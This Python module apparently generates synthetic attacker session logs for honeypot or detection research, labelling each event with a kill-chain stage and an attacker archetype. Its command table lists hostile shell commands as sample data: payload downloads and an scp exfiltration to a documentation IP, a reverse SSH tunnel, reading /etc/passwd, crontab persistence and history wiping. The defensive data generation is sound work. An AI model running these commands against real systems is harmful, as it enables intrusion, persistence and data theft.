
from __future__ import annotations

import ipaddress
import random

from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Optional


STAGES = [
    "recon",
    "delivery",
    "exploitation",
    "installation",
    "c2",
    "actions_on_objective",
]


STAGE_COMMANDS = {
    "recon": [
        "whoami",
        "uname -a",
        "id",
        "cat /etc/passwd",
        "ifconfig",
        "netstat -an",
        "ps aux",
        "df -h",
        "cat /proc/cpuinfo",
    ],
    "delivery": [
        "wget http://198.51.100.4/payload.sh",
        "curl -O http://198.51.100.4/sample.bin",
        "tftp -g 198.51.100.4 -r sample.elf",
    ],
    "exploitation": [
        "chmod +x payload.sh",
        "./payload.sh",
        "python3 exploit_simulation.py",
        "echo test > /tmp/simulation.log",
    ],
    "installation": [
        "crontab -l",
        "crontab -e",
        "useradd simulation_user",
        "systemctl enable simulation_service",
    ],
    "c2": [
        "curl -s http://198.51.100.4/beacon",
        "ssh -R 4444:localhost:22 relay@198.51.100.4",
        "connection_simulation --beacon",
    ],
    "actions_on_objective": [
        "tar -czf /tmp/sample.tar.gz /tmp/simulation_data",
        "scp /tmp/sample.tar.gz analyst@198.51.100.4:",
        "history -c",
    ],
}


ARCHETYPE_CONFIG = {
    "bot": {
        "weight": 0.55,
        "timing": (0.8, 0.25),
        "session_len": (8, 18),
        "success_rate": 0.35,
        "max_stage": 2,
        "advance_probability": 0.25,
    },
    "script_kid": {
        "weight": 0.30,
        "timing": (4.0, 2.0),
        "session_len": (10, 25),
        "success_rate": 0.55,
        "max_stage": 4,
        "advance_probability": 0.50,
    },
    "operator": {
        "weight": 0.15,
        "timing": (20.0, 10.0),
        "session_len": (18, 45),
        "success_rate": 0.80,
        "max_stage": 5,
        "advance_probability": 0.70,
    },
}


@dataclass
class Session:
    session_id: str
    src_ip: str
    archetype: str
    start_time: datetime
    events: list[dict] = field(default_factory=list)
    attacker_id: str = ""


def _make_private_ip(index: int) -> str:
    """Return a private IPv4 address for a synthetic attacker."""
    network = ipaddress.IPv4Network("10.0.0.0/8")

    if not 1 <= index < network.num_addresses - 1:
        raise ValueError("IP index is outside the available private range.")

    return str(ipaddress.IPv4Address(int(network.network_address) + index))



def _generate_stage_sequence(
    archetype: str,
    n_events: int,
    rng: random.Random,
) -> list[str]:
    """Generate a simulated sequence of attack stages."""
    config = ARCHETYPE_CONFIG[archetype]
    max_stage = config["max_stage"]
    advance_probability = config["advance_probability"]

    current = 0
    sequence = []

    for _ in range(n_events):
        sequence.append(STAGES[current])

        value = rng.random()

        if current < max_stage and value < advance_probability:
            current += 1
        elif current > 0 and value > 0.90:
            current -= 1

    return sequence



def generate_session(
    archetype: str,
    start_time: Optional[datetime] = None,
    src_ip: Optional[str] = None,
    session_id: Optional[str] = None,
    attacker_id: Optional[str] = None,
    rng: Optional[random.Random] = None,
) -> Session:
    if archetype not in ARCHETYPE_CONFIG:
        raise ValueError(f"Unknown archetype: {archetype}")

    rng = rng or random.Random()

    if start_time is None:
        start_time = datetime.now(timezone.utc)

    if src_ip is None:
        src_ip = _make_private_ip(rng.randint(1, 2**24 - 2))

    if attacker_id is None:
        attacker_id = f"attacker-{rng.randint(100000, 999999)}"

    if session_id is None:
        session_id = f"sess-{rng.randint(100000, 999999)}"

    config = ARCHETYPE_CONFIG[archetype]
    n_events = rng.randint(*config["session_len"])
    mean_gap, std_gap = config["timing"]

    stages = _generate_stage_sequence(archetype, n_events, rng)

    session = Session(
        session_id=session_id,
        src_ip=src_ip,
        archetype=archetype,
        start_time=start_time,
        attacker_id=attacker_id,
    )

    timestamp = start_time

    for stage in stages:
        gap = max(0.1, rng.gauss(mean_gap, std_gap))
        timestamp += timedelta(seconds=gap)

        command = rng.choice(STAGE_COMMANDS[stage])
        success = rng.random() < config["success_rate"]

        session.events.append({
            "ts": timestamp.isoformat(),
            "command": command,
            "stage": stage,
            "success": success,
        })

    return session


def generate_dataset(
    n_sessions: int = 150,
    seed: Optional[int] = 42,
) -> list[Session]:
    """Generate synthetic sessions for a persistent attacker population."""
    if n_sessions < 1:
        raise ValueError("n_sessions must be >= 1")

    rng = random.Random(seed)

    n_attackers = max(1, round(n_sessions * 0.40))

    if n_sessions > n_attackers * 12:
        raise ValueError("Requested sessions exceed the allocation limit.")

    archetypes = list(ARCHETYPE_CONFIG)
    weights = [ARCHETYPE_CONFIG[name]["weight"] for name in archetypes]

    attackers = []

    for index in range(1, n_attackers + 1):
        archetype = rng.choices(archetypes, weights=weights, k=1)[0]

        attackers.append({
            "attacker_id": f"attacker-{index:06d}",
            "src_ip": _make_private_ip(index),
            "archetype": archetype,
            "session_count": 1,
        })

    for _ in range(n_sessions - n_attackers):
        eligible = [a for a in attackers if a["session_count"] < 12]

        selection_weights = [
            1.0 + min(a["session_count"], 5) * 0.25
            for a in eligible
        ]

        chosen = rng.choices(
            eligible,
            weights=selection_weights,
            k=1,
        )[0]

        chosen["session_count"] += 1

    sessions = []
    base_time = datetime(2026, 1, 1, tzinfo=timezone.utc)

    for attacker in attackers:
        start_time = base_time + timedelta(days=rng.randint(0, 30))

        for session_number in range(attacker["session_count"]):
            if session_number:
                start_time += timedelta(hours=rng.randint(1, 72))

            session = generate_session(
                archetype=attacker["archetype"],
                start_time=start_time,
                src_ip=attacker["src_ip"],
                attacker_id=attacker["attacker_id"],
                session_id=(
                    f"{attacker['attacker_id']}"
                    f"-session-{session_number + 1:03d}"
                ),
                rng=rng,
            )

            sessions.append(session)

    rng.shuffle(sessions)
    return sessions


def sessions_to_records(sessions: list[Session]) -> list[dict]:
    """Convert generated sessions into individual event records."""
    records = []

    for session in sessions:
        for event in session.events:
            records.append({
                "attacker_id": session.attacker_id,
                "session_id": session.session_id,
                "src_ip": session.src_ip,
                "true_archetype": session.archetype,
                **event,
            })

    return records
